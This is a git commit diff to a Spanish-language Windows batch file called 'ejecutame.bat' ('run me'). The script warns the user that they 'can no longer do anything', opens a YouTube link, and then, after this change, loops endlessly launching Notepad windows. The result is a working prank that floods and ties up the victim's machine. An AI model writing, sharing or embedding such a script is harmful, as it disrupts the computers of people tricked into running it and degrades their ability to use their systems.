44c3084910e560f1f55cdb85aee92ce4de1ae765
Yonoveleta <thetruevayne@gmail.com>
2024-11-14 19:58:59 +0100

    a ver ahora

--- ejecutame.bat
+++ ejecutame.bat
@@ -11,8 +11,11 @@ echo Ya no puedes hacer nada
 :: Esperar 3 segundos para generar suspenso
 timeout /t 3 /nobreak >nul
 
-:top
 start https://www.youtube.com/watch?v=8kQZHYbZkLs
+
+@ECHO off
+:top
+START %SystemRoot%\system32\notepad.exe
 GOTO top
 
 :: Terminar el script
